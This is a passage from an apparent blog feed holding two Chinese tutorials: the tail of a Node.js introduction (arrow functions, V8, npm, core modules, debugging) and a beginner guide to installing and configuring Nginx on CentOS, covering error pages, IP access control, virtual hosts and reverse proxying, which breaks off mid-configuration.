&lt;p&gt;Welcome,$&#123;user.name&#125;!&lt;/p&gt; &lt;/div&gt;` 箭头函数，在Node中，一般需要两个参数，因为回调的第一个参数通常是错误对象，这时候需要用括号把参数括起来 12const fs = require('fs');fs.readFile('package.json',(err,text) =&gt; console.log('Length:',text.length)); 在ES5及之前的版本的语言中，在函数中定义函数会把 this 引用变成全局对象。因为这个问题，下面按ES5写的类容易出错 1234567891011function User(id)&#123; // 构造器 this.id = id;&#125;User.prototype.load = function()&#123; var self = this; var query = 'SELECT * FROM users WHERE id = ?'； sql.query(query,this,id,function(err,users)&#123; self.name = users[0].name; &#125;);&#125; 给 self.name 赋值那行代码不能写成 this.name 。因为这个函数的 this 是全局变量。常用的解决办法就是在函数的入口将 this 赋值给一个变量，但箭头函数的绑定没有这个问题。 1234567891011class User &#123; constructor(id)&#123; this.id = id; &#125; load()&#123; const query = 'SELECT * FROM users WHERE id = ?'; sql.query(query,this.id,(err,users) =&gt;&#123; this.name = users[0].name; &#125;) &#125;&#125; Node 与 V8Node 的动力源自 V8 JavaScript 引擎，是由服务于 Google Chrome 的 Chromiun 项目组开发的。V8 的一个值得称道的特性是它会被 JavaScript 直接编译成机器码，另外它还有一些代码优化特性，所以Node 才会这么快。 Node的另一个本地部件 libuv ，是负责处理I/O。V8负责 JavaScript 代码的解释和执行。用C++绑定层可将 libuv 和 V8 结合起来。 使用特性组Node 包含了V8提供的ES2015特性。这些特性分为shipping、staged 和 in progress 三组。shipping 组件的特性是默认开启的，staged 和 in progress 组的特性则需要用命令行参数开启。如果想使用 staged 特性，可以在运行 Node 时加上参数 –harmony。in progress 特性稳定性较差，需要具体的特性参数来开启。 1node --v8-option | grep "in progress" 上面指令可以来查询当前可用的 ”in progress“ 特性。不同版本执行后的结果也是不一样的。 了解 Node 的发布计划Node的发行版分为长期支持版（LTS）、当前版和每日构建版三组。有些人可能喜欢更新不那么频繁的 LTS，对于那些难以管理频繁更新的大公司来说，这个版本可能更好。但如果你想跟上性能和功能的改进，当前版更合适。 安装 Node你可以直接上官网下载对用的操作系统的版本。这里我个人用的是 nvm 版本管理，自由切换版本。有兴趣可以点击了解 Node 自带的工具Node 自带了一个包管理器，以及从文件和网络 I/O 到 zlib 压缩等无所不包的核心 JavaScript模块，还有一个调试器。npm 包管理器是这个基础设施中的重要组成部分 npm命令行工具 npm是用 npm 调用的。你可以用它来安装 npm注册中心里的包，也可以用它来查找和分享你自己的项目，开源的和闭源的都行。注册中心里的每个 npm 包都会有个页面显示它的自述文件、作者和下载统计信息。另外，npm 还是一家提供 npm 服务的公司的名字。这家公司为企业提供商业服务，包括托管私有的 npm包。你可以按月支付服务费，把公司的源码托管给他们，这样你的 JavaScript开发人员就可以用 npm轻松安装你的私有包了。 npm要求 Node项目所在的目录下有一个 package.json文件。创建 package.json文件的最简单方法是使用 npm。在命令行中输入下面这些命令： 123mkdir example-projectcd example-projectnpm init -y 打开 package.json，你会看到简单的 JSON 格式的项目描述信息。如果你现在用带有参数--save 的 npm命令从 npm 网站上安装一个包，它会自动更新你的 package.json文件。试着输入 npm install ，或简写为 npm i ： 1npm i --save express 打开 package.json，应该会看到 dependencies 属性下面新增加的 express 。另外，看一下node_modules 文件夹，你会看到新创建的 express目录。里面是刚安装的那个版本的 Express。你也可以用 –global 参数做全局安装。应尽可能地将包安装在项目里，但对于用在 Node JavaScript代码之外的命令行工具，全局安装更合适。比如用 npm 安装命令行工具 ESLint 时，我们采用全局安装。 Node还自带了很多非常实用的库，统称为核心模块。 核心模块Node的核心模块相当于其他语言的标准库，它们是编写服务器端 JavaScript 所需要的工具。JavaScript 标准本身没有任何处理网络的东西，甚至连处理文件I/O的东西都没有。Node以最少的代码给它加上了文件和TCP/IP网络功能，使其成为了一个可用的服务器端编程语言。 文件系统 Node 不仅有文件系统(fs、path)、TCP客户端和服务端库（net）、HTTP库（http和https）和域名解析库（dns），还有一些经常用来写判断的断言库（assert），以及一个用来查询平台消息的操作系统库（os） Node 还有一些独有库。事件模块是一个处理事件的小型库，Node的大多数API都是以它为基础来做的。比如说，流模块用事件模块提供了一个处理流数据的抽象接口。因为Node 中的所有数据流用的都是同样的API，所以可以轻松组装出来软件组件。如果有一个文件流读取器，就可以很方便地把它跟压缩数据的 zlib 连接在一起，然后这个 zlib 再连接一个文件流写入器，从而形成一个文件流处理管道。 下面代码中，用Node 的 fs 模块创建了读和写流，然后把它们通过另外一个流（gzip）连接起来传输数据。 123456const fs = require('fs');const zlib = require('zlib');const gzip = zlib.createGzip();const outStream = fs.createWriteStream('output.js.gz');fs.createReadStream('./node-stream.js').pipe(gzip).pipe(outStream); 网络 在Node 中搭一个服务器只需要加载 http 模块，然后给它一个函数。这个函数有两个参数，即请求和响应。 12345678const http = require('http');const port = 8080;const server = http.createServer((req,res) =&gt;&#123; res.end('Hello world'); &#125;);server.listen(port,()=&gt;&#123; console.log('Server listening on http://localhost:%s',port);&#125;); 将上面的代码保存到hellow.js文件中，用 node hello.js 运行它，就可以在 http://locahost:8080 看到这段消息。 调试器Node 自带调试器支持单步执行 REPL（读取-计算-输出-循环）。这个调试器在工作时会用一个网络协议跟你的程序对话。带着 debug 参数运行城西，就可以对这个程序开启调试器。比如要调试上面的代码 1node debug hello.js 然后可以看到下面的输出 1234567&lt; Debugger listening on ws://127.0.0.1:9229/55258211-4e9c-444c-90eb-9f84c28fb532&lt; For help see https://nodejs.org/en/docs/inspector&gt; 1 (function (exports, require, module, __filename, __dirname) &#123; const http = require('http'); 2 const port = 8080; 3 const server = http.createServer((req,res) =&gt;&#123; 我们可以在代码中的任何地方添加 debugger 语句来设置断点。遇到 debugger 语句后，调试器就会把程序停住，然后你可以输入命令。比如说，你写了一个 REST API来为新用户创建账号，但发现代码貌似没有把新用户密码的散列值写到数据库里。你可以在 User 类的 save 方法那里加一个 debugger ，然后单步执行每一条指令，看看发生了什么。 交互式调试 Node支持 Chrome调试协议。如果要用 Chrome的开发者工具调试一段脚本，可以在运行程序时加上 –inspect 参数： 1node --inspect --debug-brk 这样 Node 就会启动调试器，并停在第一行。它会输出一个 URL 到控制台，你可以在Chrome 中打开这个 URL，然后用 Chrome的调试器进行调试。Chrome的调试器可以一行行地执行代码，还能显示每个变量和对象的值。这要比在代码里敲 console.log 好得多。 三种主流的Node程序Node 程序主要分成三种类型：Web 应用程序、命令行工具和后台程序、桌面程序。提供单页应用的简单程序、REST微服务已经全栈的Web应用都属于Web应用程序。npm/gulp和webpack 都属于Node写的命令行工具。后台程序就是后台服务，比如PM2进程管理器。桌面程序一般是用Electron框架写的软件，Electron用Node作为基于Web 的桌面应用的后台。Atom 和 Studio Code 文本编辑器都属于这一类。 Web 应用程序Node 是服务端JavaScript平台，所以用它搭建Web应用程序是理所当然的事件。既然客户端和服务端用的都是 JavaScript ，代码难免会有在这两种环境里重用的机会。Node Web 应用一般是用 Express 这样的框架写的。创建一个新目录，安装Express 模板，来快速创建一个Express Web 应用程序 1234mkdir hello_expresscd hello_expressnpm intt -ynpm i express --S 把代码存到 server.js 中 12345678const express = require('express');const app = express();app.get('/',(req,res) =&gt;&#123; res.send('Hello World!');&#125;);app.listen(3000,()=&gt;&#123; console.log('Express web app on localhost:3000');&#125;); 接着输入 1npm start 启动这个监听端口3000的 Node Web 服务器。在浏览器打开就可以看到 res.send 里面的文本了。 命令行工具和后台程序Node 可以用来编写命令行工具，比如 JavaScript 开发人员所用的进程管理器和转义器。它可以作为一种方便的方式来编写其他操作的命令行工具，比如图片转换、控制媒体文件的播放的脚本等。 下面的例子 123// cli.jsconst [nodePath, scriptPath, name]= process.argv;console.log('Hello',name,nodePath,scriptPath); 然后运行 1node cli.js yourName 会打印出来 1Hello yourName 这里用了解构，从 process.argv 中拉取第三个参数。所有 Node 程序都可以访问 process 对象，这是用户向程序中传递参数的基础。 Node 命令行还可以做其他事情。如果在程序的开头加上 #！,并赋予其执行许可（ chmod +x cli.js ），shell 就可以在调用程序时使用 Node。也就是说可以像运行其他 shell 脚本那样运行 Node程序。在类 Unix系统中用下面这样的代码： 1#!/usr/bin/env node 这样你就可以用 Node代替 shell脚本。也就是说 Node可以跟其他任何命令行工具配合，包括后台程序。Node程序可以由 cron调用，也可以作为后台程序运行。 桌面程序如果你用过 Atom或 Visual Studio Code文本编辑器，那就用过 Node。Electron框架用 Node做后台，所以只要需要访问硬盘或网络，Electron 就会用到 Node。Electron 还用 Node 来管理依赖项，也就是说你可以用 npm往 Electron项目里添加包。 Electron 适合 Node 的应用程序我们已经看过一些能用 Node搭建的应用程序了，但 Node擅长的领域不止于此。Node一般用来创建实时的 Web 应用，这几乎无所不包，从直接面对用户的聊天服务器到采集分析数据的后台程序都属于此类。在 JavaScript中，函数是一等对象，Node又有内建的事件模型，所以用它来写异步实时程序比用其他脚本语言更自然。如果你要搭建传统的模型视图控制器（MVC）Web 应用，用 Node 也很适合。Ghost 等一些流行的博客引擎就是用 Node 搭建的。在搭建这几种类型的 Web 应用程序方面，Node 是一个经过实践检验的平台。虽然开发风格跟用 PHP的 WordPress不同，但 Ghost支持的功能是类似的，包括模板和多用户管理区。Node还能做一些用其他语言很难做到的事情。它是基于 JavaScript的，所以在 Node中能运行浏览器中的 JavaScript。复杂的客户端应用可以经过改造在 Node服务器上运行，让服务器进行预渲染，从而加快页面在浏览器中的渲染速度，也有利于搜索引擎进行索引。最后，如果你想要搭建一个桌面端或移动端应用，建议试一下 Electron，它也是由 Node 支撑起来的。现在 Web用户界面的体验跟桌面端应用一样丰富，Electron桌面端应用足以抗衡本地Web应用，还能缩短开发时间。Electron支持三种主流操作系统，所以你可以在 Windows、Linux和 macOS上重用这些代码。 总结 Node 是用来搭建 JavaScript 应用程序的平台，基于事件和非阻塞的特性 V8 被用作 JavaScript 运行 libuv 是提供快速、跨平台、非阻塞I/O的本地库 被称为核心模块的Node 标准库很精巧，为 JavaScript 添加了磁盘I/O Node 自带了一个调试器和依赖管理器(npm) Node 可以用于搭建 Web应用程序、命令行工具、甚至桌面程序。]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端必备的Nginx学习]]></title>
    <url>%2F2018-11-26-%E5%89%8D%E7%AB%AF%E5%BF%85%E5%A4%87%E7%9A%84Nginx%E5%AD%A6%E4%B9%A0.html</url>
    <content type="text"><![CDATA[由于机缘巧合，认识了一些朋友，给我介绍了搬瓦工的网站。买了一个国外的服务器，既可以翻墙又拥有了一个搭载 Centos 6 的服务器。一年19.99美元，折合人民币也就130左右，一键搭建。有兴趣可以点击了解详情。 很久之前就看到胖哥，出了关于nginx 的教程，今天来根据他的教程在买的 linux 服务器上面搭建 nginx。 胖哥的视频教程 连接 linux 服务器在这里我是用了 xshell6 和 xftp6。可以直接到官网填个邮箱，然后官方会发给你邮箱分别的下载地址。或者你觉得懒的，可以直接点击我的百度云盘下载 了解Nginx和环境准备Nginx是什么？Nginx (engine x) 是一个高性能的HTTP和反向代理服务，也是一个IMAP/POP3/SMTP服务。Nginx是由伊戈尔·赛索耶夫为俄罗斯访问量第二的Rambler.ru站点（俄文：Рамблер）开发的，第一个公开版本0.1.0发布于2004年10月4日。 Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。其特点是占有内存少，并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好，中国大陆使用nginx网站用户有：百度、京东、新浪、网易、腾讯、淘宝等。（以上内容来自百度百科） Nginx的优点 支持海量高并发：采用IO多路复用epoll。官方测试Nginx能够支持5万并发链接，实际生产环境中可以支撑2-4万并发连接数。 内存消耗少：在主流的服务器中Nginx目前是内存消耗最小的了，比如我们用Nginx+PHP，在3万并发链接下，开启10个Nginx进程消耗150M内存。 免费使用可以商业化：Nginx为开源软件，采用的是2-clause BSD-like协议，可以免费使用，并且可以用于商业。 配置文件简单：网络和程序配置通俗易懂，即使非专业运维也能看懂。 使用yum安装12yum -y install gcc gcc-c++ autoconf pcre-devel make automakeyum -y install wget httpd-tools vim 分别使用上面的指令安装，安装完成后会显示安装了什么依赖，大概下面的样子 12345678Installed: httpd-tools.x86_64 0:2.2.15-69.el6.centos vim-enhanced.x86_64 2:7.4.629-5.el6_8.1 wget.x86_64 0:1.12-10.el6 Dependency Installed: apr.x86_64 0:1.3.9-5.el6_9.1 apr-util.x86_64 0:1.3.9-3.el6_0.1 gpm-libs.x86_64 0:1.20.6-12.el6 vim-common.x86_64 2:7.4.629-5.el6_8.1 vim-filesystem.x86_64 2:7.4.629-5.el6_8.1 上面的过程主要安装了一些linux系统下面的编译器以及一些服务或者是相关便于linux使用的内容。有兴趣的可以一个一个百度了解 建立目录根据个人喜好，喜欢整理的就建立一下，自己为例 123456789101112cd / # 进去 '/' 文件夹cd root # 进去 'root' 文件夹ls # 显示 root 文件夹里面的文件mkdir lbh # 创建lbh文件夹cd lbh # 进去 'lbh' 文件夹mkdir app # 创建app文件夹mkdir backup # 创建backup文件夹mkdir download # 创建download文件夹mkdir logs # 创建logs文件夹mkdir work # 创建work文件夹ls # 显示 lbh 文件夹里面的文件# app backup download logs work 也可以使用xftp进去可视的创建和查看 Nginx的快速搭建Nginx版本说明打开nginx官网的下载页面，可以看到以下几个版本 Mainline version ：开发版,主要是给广大Nginx爱好者，测试、研究和学习的，但是不建议使用于生产环境。 Stable version : 稳定版,也就是我们说的长期更新版本。这种版本一般比较成熟，经过长时间的更新测试，所以这种版本也是主流版本。 legacy version : 历史版本，如果你需要以前的版本，Nginx也是有提供的。 1yum list | grep nginx # 查看yum中是否已经有 nginx 如果不存在，或者不是需要的版本，可以自行配置。从官网的 stable 版本可以得下以下代码 12345[nginx]name=nginx repobaseurl=http://nginx.org/packages/OS/OSRELEASE/$basearch/gpgcheck=0enabled=1 创建 yum源先用vim 编辑器建立一个 yum 源，关于 yum源的解释，可以简单理解为：repo文件即是Linux中常说的源文件(repositry)，在使用yum命令的时候系统会自动读取repo文件，然后去repositry获取软件。每一个repo文件代表不同的软件源，其中的baseurl，表明了repositry的地址，支持ftp协议，http协议和file协议。其他具体的请自行百度。 1vim /etc/yum.repos.d/nginx.repo 接着会弹出一个界面，按 i(insert)，复制粘贴刚刚的代码。修改其中的一些代码 1baseurl=http://nginx.org/packages/OS/OSRELEASE/$basearch/ OS对应你系统，我的是 centos,OSRELEASE是版本号，改为 6。完整改完 12345[nginx]name=nginx repobaseurl=http://nginx.org/packages/centos/6/$basearch/gpgcheck=0enabled=1 接着按esc退出编辑状态，并输入 :wq进行保存。yum源就创建好了。接着重新输入 1234567891011121314151617yum list | grep nginx # 查看yum中是否已经有 nginx#可以得到nginx.x86_64 1.14.1-1.el6.ngx nginx nginx-debug.x86_64 1.8.0-1.el6.ngx nginx nginx-debuginfo.x86_64 1.14.1-1.el6.ngx nginx nginx-module-geoip.x86_64 1.14.1-1.el6.ngx nginx nginx-module-geoip-debuginfo.x86_64 1.14.1-1.el6.ngx nginx nginx-module-image-filter.x86_64 1.14.1-1.el6.ngx nginx nginx-module-image-filter-debuginfo.x86_64 1.14.1-1.el6.ngx nginx nginx-module-njs.x86_64 1.14.1.0.2.5-1.el6.ngx nginx nginx-module-njs-debuginfo.x86_64 1.14.1.0.2.5-1.el6.ngx nginx nginx-module-perl.x86_64 1.14.1-1.el6.ngx nginx nginx-module-perl-debuginfo.x86_64 1.14.1-1.el6.ngx nginx nginx-module-xslt.x86_64 1.14.1-1.el6.ngx nginx nginx-module-xslt-debuginfo.x86_64 1.14.1-1.el6.ngx nginx nginx-nr-agent.noarch 2.0.0-12.el6.ngx nginx pcp-pmda-nginx.x86_64 3.10.9-9.el6 base 可以看到1.14.1的nginx，接着安装 1yum install nginx 安装完成后，输入 1nginx -v # nginx version: nginx/1.14.1 有版本号就是已经安装完成了。 Nginx基本配置文件详解在使用yum安装完Nginx后，需要知道系统中多了那些文件，它们都安装到了那里。可以使用下面的命令进行查看： 1rpm -ql nginx rpm 是linux的rpm包管理工具，-q 代表询问模式，-l 代表返回列表，这样我们就可以找到nginx的所有安装位置了。可以看到以下的内容 nginx.confnginx.conf文件是Nginx的总配置文件，在我们搭建服务器的时候需要经常调整的文件。 进入 etc/nginx目录下，用vim打开 12cd /etc/nginxvim nginx.conf 下面是文件的注释 1234567891011121314151617181920212223242526272829user nginx; # 运行用户，默认是nginx,可以不进行设置worker_processes 1; # nginx 进程，一般设置为和CPU核数一样error_log /var/log/nginx/error.log warn; # 错误日志存放目录pid /var/run/nginx.pid; # 进程 pid 存放位置events &#123; worker_connections 1024; # 单个后台进程的最大并发数&#125;http &#123; include /etc/nginx/mime.types; #文件扩展名与类型映射表 default_type application/octet-stream; #默认文件类型 # 设置日志模式 log_format main '$remote_addr - $remote_user [$time_local] "$request" ' '$status $body_bytes_sent "$http_referer" ' '"$http_user_agent" "$http_x_forwarded_for"'; access_log /var/log/nginx/access.log main; # nginx 访问日志存放位置 sendfile on; # 开启高效传输模式 #tcp_nopush on; # 减少网络报文段的数量 keepalive_timeout 65; # 保持连接的时间，也叫做超时是啊金 #gzip on; # 开始 gzip压缩 include /etc/nginx/conf.d/*.conf; # 包含的子配置项位置和文件&#125; default.conf可以看到最后有一个子文件的配置项，那我们打开这个include子文件配置项看一下里边都有些什么内容。 12345678910[root@host ~]# cd /etc/nginx[root@host nginx]# vim nginx.conf[root@host nginx]# vim default.conf[root@host nginx]# lsconf.d koi-utf mime.types nginx.conf uwsgi_paramsfastcgi_params koi-win modules scgi_params win-utf[root@host nginx]# cd conf.d[root@host conf.d]# lsdefault.conf[root@host conf.d]# vim default.conf 通过以上指令进入 conf.d文件夹，然后用 vim 编辑器打开 default.conf，得到以下文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445server &#123; listen 80; # 配置监听端口 server_name localhost; # 配置域名 #charset koi8-r; #access_log /var/log/nginx/host.access.log main; location / &#123; root /usr/share/nginx/html; # 服务默认启动目录 index index.html index.htm; # 默认访问文件 &#125; #error_page 404 /404.html; # 配置404页面 # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; # 错误状态码的显示页面，配置后需要重新启动 location = /50x.html &#123; root /usr/share/nginx/html; &#125; # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # #location ~ \.php$ &#123; # proxy_pass http://127.0.0.1; #&#125; # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # #location ~ \.php$ &#123; # root html; # fastcgi_pass 127.0.0.1:9000; # fastcgi_index index.php; # fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; # include fastcgi_params; #&#125; # deny access to .htaccess files, if Apache's document root # concurs with nginx's one # #location ~ /\.ht &#123; # deny all; #&#125;&#125; 按 :q退出。 明白了这些配置项，可以知道我们的服务目录放在了/usr/share/nginx/html下，可以使用命令进入看一下目录下的文件。 123cd /usr/share/nginx/htmlls# 50x.html index.html 可以用编辑器分别打开这两个html文件 50.html 123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Error&lt;/title&gt;&lt;style&gt; body &#123; width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;An error occurred.&lt;/h1&gt;&lt;p&gt;Sorry, the page you are looking for is currently unavailable.&lt;br/&gt;Please try again later.&lt;/p&gt;&lt;p&gt;If you are the system administrator of this resource then you should checkthe &lt;a href="http://nginx.org/r/error_log"&gt;error log&lt;/a&gt; for details.&lt;/p&gt;&lt;p&gt;&lt;em&gt;Faithfully yours, nginx.&lt;/em&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; index.html 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Welcome to nginx!&lt;/title&gt;&lt;style&gt; body &#123; width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;&lt;p&gt;If you see this page, the nginx web server is successfully installed andworking. Further configuration is required.&lt;/p&gt;&lt;p&gt;For online documentation and support please refer to&lt;a href="http://nginx.org/"&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;Commercial support is available at&lt;a href="http://nginx.com/"&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 启动服务在 nginx 默认启动目录下，输入 12345678910nginx -t # 测试配置# 得到# nginx: the configuration file /etc/nginx/nginx.conf syntax is ok# nginx: configuration file /etc/nginx/nginx.conf test is successfulnginx # 接着启动服务ps -ef | grep nginx # 查看进程# root 24574 1 0 02:22 ? 00:00:00 nginx: master process nginx# nginx 24575 24574 0 02:22 ? 00:00:00 nginx: worker process# root 24577 24278 0 02:23 pts/0 00:00:00 grep nginx 接着打开你的服务器的所在的ip地址，看到以下的画面，就说明配置成功了 Nginx服务启动、停止、重启服务启动默认情况下，nginx 是不会自动开启的，需要手动启动。有多种方法 nginx直接启动 1nginx systemctl命令启动 使用Linux 的命令进行启动，这种方法无论是启动什么服务都是一样的，只是更改了服务的名字 1systemctl start nginx.service 输入命令后，没有任何的提示，然后使用下面的命令进行查询服务的运行状态 1ps aux | grep nginx 可以得到下面的结果 123root 24574 0.0 0.1 47384 948 ? Ss 02:22 0:00 nginx: master process nginxnginx 24575 0.0 0.7 47788 3680 ? S 02:22 0:00 nginx: worker processroot 24584 0.0 0.4 103380 2168 pts/0 S+ 02:45 0:00 grep nginx 有了这三条记录，说明Nginx 服务被正常开启了。 服务停止立即停止服务 1nginx -s stop 强制停止方法，无论是否在工作 从容停止服务 1nginx -s quit 这种方法需要进程完成当前工作后再停止 killadd 停止服务 1killall nginx systemctl停止服务 1systemctl stop nginx.service 服务重启systemctl重启服务 1systemctl restart nginx.service 重载配置文件 1nginx -s reload 查看端口号 在默认情况下，Nginx启动后会监听80端口，从而提供HTTP访问，如果80端口已经被占用则会启动失败。我么可以使用netstat -tlnp命令查看端口号的占用情况。 12345678910netstat -tlnp# 可以看到Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 24574/nginx tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN 1465/master tcp 0 0 0.0.0.0:27652 0.0.0.0:* LISTEN 24426/sshd tcp 0 0 ::1:25 :::* LISTEN 1465/master tcp 0 0 :::443 :::* LISTEN 1906/python tcp 0 0 :::27652 :::* LISTEN 24426/sshd 自定义错误页和访问设置多错误指向一个页面在/etc/nginx/conf.d/default.conf 是可以看到下面这句话的。 1error_page 500 502 503 504 /50x.html; error_page指令用于自定义错误页面，500，502，503，504 这些就是HTTP中最常见的错误码，/50.html用于表示当发生上述指定的任意一个错误的时候，都是用网站根目录下的/50.html文件进行处理。 单独为错误置顶处理方式在default.conf 文件中添加以下设置 1error_page 404 /404x.html; 接着输入 :wq保存退出。进入网站的目录 usr/share/nginx/html新建一个404x.html文件，并写入一些信息 123456&lt;html&gt;&lt;meta charset="UTF-8"&gt;&lt;body&gt;&lt;h1&gt;错误:404!页面没有找到!&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; 重启服务,得到的错误页面 把错误码换成一个地址处理错误的时候，不仅可以只使用本服务器的资源，还可以使用外部的资源。比如我们将配置文件设置成这样。 1error_page 404 http://laibh.top 这样子，当报404错误的时候就会链接到我的博客的网址去了。、 简单实现访问控制有时候我们的服务器只允许特定主机访问，比如内部OA系统，或者应用的管理后台系统，更或者是某些应用接口，这时候我们就需要控制一些IP访问，我们可以直接在location里进行配置。 可以直接在default.conf里进行配置。 1234location / &#123; deny 123.9.51.42; allow 45.76.202.231; &#125; 配置完成后，重启一下服务器就可以实现限制(deny)和允许(allow)访问了。这在工作中非常常用，一定要好好记得。 Nginx访问权限deny是禁止访问，allow是允许访问。但Nginx的访问控制还是比较复杂的 指令优先级1234location / &#123; allow 45.76.202.231; deny all; &#125; 上面的配置，表示只允许 45.76.202.231访问，禁止ip地址访问。而如果将 deny语句提前，则会发现所有的ip都不可以访问了。这说明了：在同一个块中的两个权限指令，先出现的设置为覆盖后出现的设置 复杂访问控制权限匹配在工作中，访问权限的控制需求更加复杂，例如，对于网站下的img（图片目录）是运行所有用户访问，但对于网站下的admin目录则只允许公司内部固定IP访问。这时候仅靠deny和allow这两个指令，是无法实现的。我们需要location块来完成相关的需求匹配。 =：精确匹配 上面的需求，配置代码如下： 123456location =/img&#123; allow all;&#125;location =/admin&#123; deny all;&#125; 使用正则表达式设置访问权限只有精确匹配有时是完不成我们的工作任务的，比如现在我们要禁止访问所有php的页面，php的页面大多是后台的管理或者接口代码，所以为了安全我们经常要禁止所有用户访问，而只开放公司内部访问的。 123location ~\.php$&#123; deny all;&#125; Nginx设置虚拟主机虚拟主机是指在一台物理主机服务器上划分出多个磁盘空间，每个磁盘空间都是一个虚拟主机，每台虚拟主机都可以对外提供Web服务，并且互不干扰。在外界看来，虚拟铸就是一台独立的服务器主机，这意味着用户能够利用虚拟主机把多个不同域名的网站部署在同一台服务器上，即解决了维护服务器技术的难题，同时有节省了服务器硬件成本和相关的维护费用。 配置虚拟主机可以基于端口号、基于IP和基于域名。 基于端口号配置虚拟主机基于端口号来配置虚拟主机，是Nginx 中最简单的一种方式，原理就是Nginx监听多个端口，根据不同的端口号，来区分不同的网站。 首先，我们先进入主文件 etc/nginx/conf.d/default.conf,编辑器打开。可以选择新建一个文件，在文件夹 conf.d下面就可以，也可以还是配置在原来的子文件里。 vim 8001.conf 新建一个文件，命名为 8001.conf, 按i键后进入编辑模式，新增配置文件的server选项。 123456server&#123; listen 8001; # 监听的端口号 server_name localhost; # 访问本机 root /usr/share/nginx/html/html8001; # 文件路径 index index.html;&#125; esc退出编辑模式，:wq保存文件。 进入到原来上一个服务文件路径 1cd /usr/share/nginx/html 新增 html文件夹,并进入该文件夹，新增 index.html 123mkdir html8001cd html8001vim index.html index.html里面的内容 123&lt;html&gt; &lt;h1&gt;Welcome to port 8001&lt;/h1&gt;&lt;/html&gt; 然后重启一下 nginx服务器 1nginx -s reload 接着在浏览器打开，你的ip地址后面加上端口号 :8001，就可以访问到一下的画面了。 基于IP配置虚拟主机基于ip和基于端口的配置几乎是一样的，只是把 server_name选项，配置成IP就可以了。 按照上面的配置可以修改为： 123456server&#123; listen 8001; # 监听的端口号 server_name 147.124.12.32; root /usr/share/nginx/html/html8001; # 文件路径 index index.html;&#125; 由于我这个服务器也没有多个ip,所以也无法进行实践。 使用域名设置虚拟主机这个主要在于域名解析这块，首先你需要购买一个域名，接着在购买处的后台管理设置域名解析，解析到你的服务器ip跟ip地址8001端口的位置。 接着我们修改之前的两个文件， defalut.conf 1234server&#123; listen 80; # 监听的端口号 server_name 域名1; &#125; 8001.conf 123456server&#123; listen 8001; # 监听的端口号 server_name 域名2; root /usr/share/nginx/html/html8001; # 文件路径 index index.html;&#125; 配置好了之后，就进行重启，然后在浏览器输入你的两个域名，就可以访问这两个网页了。 Nginx反向代理的设置web模式基本的都是标准的CS结构，即Client端到Server端。代理就是在Client端和Server端之间增加一个提供特定功能的服务器，这个服务器就是我们所说的代理服务器。 这里我百度了具体的概念，以下的内容可以参考下 正向代理与反向代理 借鉴上面原文的话就是： 总结来说，正向代理 是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端必须要进行一些特别的设置才能使用正向代理。 正向代理的用途： 访问原来无法访问的资源，如google 可以做缓存，加速访问资源 对客户端访问授权，上网进行认证 代理可以记录用户访问记录（上网行为管理），对外隐藏用户信息 反向代理（Reverse Proxy）实际运行方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器。 反向代理的作用： 保证内网的安全，可以使用反向代理提供WAF功能，阻止web攻击大型网站，通常将反向代理作为公网访问地址，Web服务器是内网。 负载均衡，通过反向代理服务器来优化网站的负载 最简单的反向代理假如我们要访问 域名1然后反向代理到 域名2这个网站。我们直接修改 defalut.conf配置文件。 1234567server&#123; listen 80; # 监听的端口号 server_name 域名1; location / &#123; proxy_pass 域名2； &#125;&#125; 一般我们反向代理的都是一个ip，但是代理域名也是可以的。 其他反向代理指令 proxy_set_header:在将客户端请求发送给后端服务器之前，更改来自客户端的请求头信息 proxy_connect_timeout:配置Nginx 与后端代理服务器尝试建立连接的超时时间 proxy_read_timeout:配置Nginx 向后端务器组发出read请求后，等待相应的超时时间 proxy_send_timeout:配置Nginx 向后端务器组发出write请求后，等待相应的超时时间 proxy_redirect:用于修改后端服务器返回的响应头中的Location和Refresh Nginx适配PC或移动设备通过配置Nginx来识别移动端和pc端来展示不同的页面。 $http_user_agent的使用Nginx通过内置变量 $http_user_agent，可以获取到请求客户端的 userAgent ，就可以判断用户目前处于移动端还是pc端，进而展示不同的页面给用户。 首先，先在 /usr/share/nginx目录下新建两个文件夹，分别是pc和mobile目录 123cd /usr/share/nginxmkdir pcmkdir mobile 接着分别在两个目录文件夹下面建立 index.html mobile/index.html 123&lt;html&gt; &lt;h1&gt;I am mobile&lt;/h1&gt;&lt;/html&gt; pc/index.html 123&lt;html&gt; &lt;h1&gt;I am pc&lt;/h1&gt;&lt;/html&gt; 回到 etc/nginx/conf.d文件夹，打开 default.conf,修改 8001.conf文件 1234567891011server&#123; listen 8001; server_name localhost; location / &#123; root 